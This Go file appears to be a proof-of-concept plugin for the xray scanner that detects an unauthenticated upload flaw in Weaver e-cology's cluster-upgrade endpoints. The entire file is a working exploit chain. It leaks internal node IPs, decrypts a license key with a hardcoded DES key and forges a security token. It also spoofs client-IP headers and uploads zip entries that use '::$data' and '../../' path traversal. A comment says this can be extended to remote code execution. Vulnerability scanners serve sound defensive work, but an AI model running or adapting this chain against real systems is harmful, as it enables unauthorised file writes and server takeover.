package plugin

import (
	"archive/zip"
	"bytes"
	"crypto/des"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"git.in.chaitin.net/lohengrin/xray/event"
	"git.in.chaitin.net/lohengrin/xray/plugin/module/xhttp"
	"git.in.chaitin.net/lohengrin/xray/util"
	"git.in.chaitin.net/lohengrin/xray/xray"
	"io"
	"mime/multipart"
	urllib "net/url"
	"regexp"
	"strings"
)

func encryptDES(data, key []byte) (string, error) {
	var keyBytes []byte
	if len(key) > 8 {
		keyBytes = make([]byte, 8)
		copy(keyBytes, key)
	} else {
		keyBytes = make([]byte, 8)
		for i := 0; i < 8; i++ {
			if i < len(key) && key[i] != 0x05 {
				keyBytes[i] = key[i]
			} else {
				keyBytes[i] = 0x00
			}
		}
	}

	block, err := des.NewCipher(keyBytes)
	if err != nil {
		return "", err
	}

	bs := block.BlockSize()
	if len(data)%bs != 0 {
		return "", fmt.Errorf("crypto/cipher: input not full blocks")
	}

	buf := make([]byte, len(data))
	dst := buf

	for len(data) > 0 {
		block.Encrypt(dst, data[:bs])
		data = data[bs:]
		dst = dst[bs:]
	}

	return hex.EncodeToString(buf), nil
}

func decryptDES(data, key []byte) (string, error) {
	keyBytes := make([]byte, 8)
	copy(keyBytes, key)

	block, err := des.NewCipher(keyBytes)
	if err != nil {
		return "", err
	}

	bs := block.BlockSize()
	if len(data)%bs != 0 {
		return "", fmt.Errorf("crypto/cipher: input not full blocks")
	}

	buf := make([]byte, len(data))
	dst := buf
	for len(data) > 0 {
		block.Decrypt(dst, data[:bs])
		data = data[bs:]
		dst = dst[bs:]
	}

	return string(buf), nil
}

func pkcs5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func genZipPayload(filepath string, content []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	f, _ := w.Create(filepath)

	if _, err := f.Write(content); err != nil {
		return nil, err
	}

	if err := w.Close(); err != nil {
		return nil, err
	}

	if zipBytes, err := io.ReadAll(&buf); err != nil {
		return nil, err
	} else {
		return zipBytes, nil
	}
}

var _ = xray.NewPlugin("poc-go-ecology_clusterupgrade_upload", func(p *xray.Plugin, client *xhttp.Client) {
	p.Event(func(website *event.Website) *event.Vulnerability {
		req, _, err := xhttp.LoadFromEvent(website.HttpFlow)
		p.Check(err)

		// 先判断有没有打补丁
		r0 := req.Clone()
		p.Check(r0.ReplaceURI("/clusterupgrade/uploadFileClient.jsp"))
		res0, err := client.Do(r0)
		p.Check(err)
		if res0.GetStatusCode() != 200 || !bytes.Contains(res0.GetBody(), []byte("error")) {
			return nil
		}

		// 拿部分主节点 IP
		r1 := req.Clone()
		p.Check(r1.ReplaceURI("/login/UpgradeMessage.jsp"))
		res1, err := client.Do(r1)
		p.Check(err)

		regexPattern := "主节点IP：([0-9]{1,3}.\\*\\*.\\*\\*.[0-9]{1,3})"
		r, err := regexp.Compile(regexPattern)
		p.Check(err)

		// 如果拿不到主节点 IP，说明不是集群环境，直接返回
		matches := r.FindAllSubmatch(res1.GetBody(), -1)
		if len(matches) == 0 {
			return nil
		}
		nodeIP := string(matches[0][1])
		nodeIPStart := strings.Split(nodeIP, ".")[0]
		nodeIPEnd := strings.Split(nodeIP, ".")[len(strings.Split(nodeIP, "."))-1]

		// 拿完整的内网 IP
		r2 := req.Clone()
		p.Check(r2.ReplaceURI("/login/Upgrade.jsp"))
		res2, err := client.Do(r2)
		p.Check(err)

		regexPattern = `window\.open\("([^"]*)"\);`
		r, err = regexp.Compile(regexPattern)
		p.Check(err)
		matches = r.FindAllSubmatch(res2.GetBody(), -1)
		if len(matches) == 0 {
			return nil
		}

		url := string(matches[0][1])

		u, err := urllib.Parse(url)
		p.Check(err)

		// 判断获取到的主节点 IP 和内网 IP 是否一致（不一致不代表不存在漏洞，可能需要爆破一下，但在代码里就不做了）
		if !(strings.Contains(u.Hostname(), nodeIPStart) && strings.Contains(u.Hostname(), nodeIPEnd)) && (nodeIPStart != "127" || nodeIPEnd != "1") {
			return nil
		}

		// 做个兼容，如果主节点 IP 是 127.**.**.1，则认为是本地环境
		var realNodeIP string
		if nodeIPStart == "127" || nodeIPEnd == "1" {
			realNodeIP = "127.0.0.1"
		} else {
			realNodeIP = u.Hostname()
		}

		// 获取时间戳以及 license key，license key 用于后续二次加密
		r3 := req.Clone()
		r3.ReplaceURI("/clusterupgrade/tokenCheck.jsp")
		res3, err := client.Do(r3)
		p.Check(err)
		res3Body := res3.GetBody()
		res3Body = bytes.Replace(res3Body, []byte("{\"status\":\"failed\"}"), []byte(""), -1)
		var res3BodyMap map[string]interface{}
		p.Check(json.Unmarshal(res3Body, &res3BodyMap))
		timestamp := res3BodyMap["timestamp"].(string)
		hexKey := res3BodyMap["key"].(string)
		keyStr, err := hex.DecodeString(hexKey)
		p.Check(err)
		desKey, err := decryptDES(keyStr, []byte("ecology2018_upgrade"))
		p.Check(err)

		// 生成后续过安全校验用到的 token
		token, err := encryptDES(pkcs5Padding([]byte("wEAver2018"+timestamp), 8), []byte(desKey))
		p.Check(err)

		// windows 环境使用 ::$data 绕过
		filenameRandom := util.RandLower(5) + ".jsp"
		r4 := req.Clone()
		p.Check(r4.ReplaceURI("/clusterupgrade/uploadFileClient.jsp?token=" + token))
		r4.AddHeader("RemoteIP", realNodeIP)
		r4.AddHeader("x-forwarded-for", realNodeIP)
		r4.AddHeader("Proxy-Client-IP", realNodeIP)
		r4.AddHeader("WL-Proxy-Client-IP", realNodeIP)
		zipBytes1, err := genZipPayload(filenameRandom+"::$data", []byte("just_for_test"))
		body1 := &bytes.Buffer{}
		writer1 := multipart.NewWriter(body1)
		part1, err := writer1.CreateFormFile("file", "weaver.zip")
		p.Check(err)
		_, err = part1.Write(zipBytes1)
		p.Check(err)
		p.Check(writer1.Close())
		r4.Method = "POST"
		r4.SetHeader("Content-Type", writer1.FormDataContentType())
		r4.SetBody(body1.Bytes())
		res4, err := client.Do(r4)
		p.Check(err)
		if bytes.Contains(res4.GetBody(), []byte("安全校验失败")) {
			return nil
		}

		// 调用解压接口
		r5 := req.Clone()
		r5.ReplaceURI("/clusterupgrade/clusterUpgrade.jsp?method=upgrade&token=" + token)
		r5.Method = "GET"
		r5.AddHeader("RemoteIP", realNodeIP)
		r5.AddHeader("RemoteIP", realNodeIP)
		r5.AddHeader("x-forwarded-for", realNodeIP)
		r5.AddHeader("Proxy-Client-IP", realNodeIP)
		r5.AddHeader("WL-Proxy-Client-IP", realNodeIP)
		_, err = client.Do(r5)
		p.Check(err)

		// 访问上传的文件
		r6 := req.Clone()
		r6.ReplaceURI("/versionupgrade/temp/" + filenameRandom)
		r6.Method = "GET"
		res6, err := client.Do(r6)
		p.Check(err)
		if bytes.Contains(res6.GetBody(), []byte("just_for_test")) {
			vul := p.NewWebVulnerability(website)
			return vul
		}

		// linux 环境尝试使用 ../ 绕过（后续可结合 class 落地完成 RCE）
		r7 := req.Clone()
		p.Check(r7.ReplaceURI("/clusterupgrade/uploadFileClient.jsp?token=" + token))
		r7.AddHeader("RemoteIP", realNodeIP)
		r7.AddHeader("x-forwarded-for", realNodeIP)
		r7.AddHeader("Proxy-Client-IP", realNodeIP)
		r7.AddHeader("WL-Proxy-Client-IP", realNodeIP)
		filenameRandom = util.RandLower(5) + ".txt"
		zipBytes2, err := genZipPayload("../../"+filenameRandom, []byte("just_for_test"))
		body2 := &bytes.Buffer{}
		writer2 := multipart.NewWriter(body2)
		part2, err := writer2.CreateFormFile("file", "weaver.zip")
		p.Check(err)
		_, err = part2.Write(zipBytes2)
		p.Check(err)
		p.Check(writer2.Close())
		r7.Method = "POST"
		r7.SetHeader("Content-Type", writer2.FormDataContentType())
		r7.SetBody(body2.Bytes())
		res7, err := client.Do(r7)
		p.Check(err)
		if bytes.Contains(res7.GetBody(), []byte("安全校验失败")) {
			return nil
		}

		// 调用解压接口
		r8 := req.Clone()
		r8.ReplaceURI("/clusterupgrade/clusterUpgrade.jsp?method=upgrade&token=" + token)
		r8.Method = "GET"
		r8.AddHeader("RemoteIP", realNodeIP)
		r8.AddHeader("RemoteIP", realNodeIP)
		r8.AddHeader("x-forwarded-for", realNodeIP)
		r8.AddHeader("Proxy-Client-IP", realNodeIP)
		r8.AddHeader("WL-Proxy-Client-IP", realNodeIP)
		_, err = client.Do(r8)
		p.Check(err)

		// 访问上传的文件
		r9 := req.Clone()
		r9.ReplaceURI("/" + filenameRandom)
		r9.Method = "GET"
		res9, err := client.Do(r9)
		p.Check(err)
		if bytes.Contains(res9.GetBody(), []byte("just_for_test")) {
			vul := p.NewWebVulnerability(website)
			return vul
		}

		return nil

	})
})
